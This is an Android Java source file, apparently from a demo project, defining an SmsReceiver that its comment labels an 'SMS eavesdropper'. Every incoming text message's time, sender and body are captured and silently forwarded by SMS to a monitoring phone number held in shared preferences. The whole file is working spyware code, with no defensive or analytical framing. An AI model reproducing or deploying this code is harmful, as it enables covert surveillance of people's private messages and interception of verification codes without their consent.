package com.peter.demo.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.peter.common.utils.SharedPreferenceUtils;
import com.peter.demo.R;

import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.List;

/**
 * 短信窃听器
 * Created by songzhongkun on 16/2/24 17:03.
 */
public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String msg = "";
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        SmsMessage[] messages = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; i++) {
            byte[] pdu = (byte[]) pdus[i];
            messages[i] = SmsMessage.createFromPdu(pdu);
            msg += SmsMessage.createFromPdu(pdu).getDisplayMessageBody() + " ";
        }
        String sender = messages[0].getOriginatingAddress();
        // 得到短信的发送时间
        Date date = new Date(messages[0].getTimestampMillis());
        // 把收到的短信传递给监控者
        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String sendContent = format.format(date) + "--" + sender + "--" + msg;
        SmsManager smsManager = SmsManager.getDefault();

        String toMobile = (String) SharedPreferenceUtils.get(context, "phone", "");

        List<String> texts = smsManager.divideMessage(sendContent);
        for (String text : texts) {
            smsManager.sendTextMessage(toMobile, null, text, null, null);
        }
        // 添加一条发送结果提示
        Toast.makeText(context, R.string.success, Toast.LENGTH_LONG).show();
    }
}
